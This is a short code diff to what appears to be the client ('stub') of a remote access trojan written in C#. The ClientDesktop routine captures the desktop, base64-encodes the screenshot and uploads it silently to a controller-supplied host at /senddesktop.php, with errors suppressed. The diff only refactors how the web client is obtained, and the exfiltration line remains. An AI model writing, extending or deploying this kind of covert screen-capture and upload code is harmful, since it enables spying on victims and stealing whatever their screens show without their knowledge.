@@ -15,7 +15,6 @@ namespace stub
 {
     internal class ClientDesktop
     {
-        static WebClient webclient = WebClientHandler.wcReturn();
         static bool isStarted = false;
 
         static Bitmap bitmap;
@@ -80,7 +79,7 @@ namespace stub
                 nameValues.Add("desktop64", Convert.ToBase64String(GetDesktop().ToArray()));
 
 
-                webclient.UploadValues("http://" + ConnectionIPHandler.GetIP() + "/senddesktop.php", nameValues);
+                WebClientHandler.wcReturn().UploadValues("http://" + ConnectionIPHandler.GetIP() + "/senddesktop.php", nameValues);
             }
             catch { }
         }
